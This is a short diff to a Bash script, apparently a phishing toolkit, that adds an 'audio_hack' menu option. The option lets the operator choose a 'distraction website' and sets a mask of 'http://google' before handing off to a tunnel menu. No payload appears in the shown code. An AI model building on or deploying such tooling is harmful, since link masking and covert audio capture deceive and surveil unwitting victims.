@@ -466,6 +466,26 @@ site_vk() {
 	esac
 }
 
+## audio_hack
+audio_hack() {
+	cat <<- EOF
+		${RED}[${WHITE}01${RED}]${ORANGE} choose a distraction website (default https://Google.com)
+		
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	case $REPLY in 
+		1 | 01)
+			website="google"
+			mask='http://google'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; audio_hack; };;
+	esac
+}
+
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
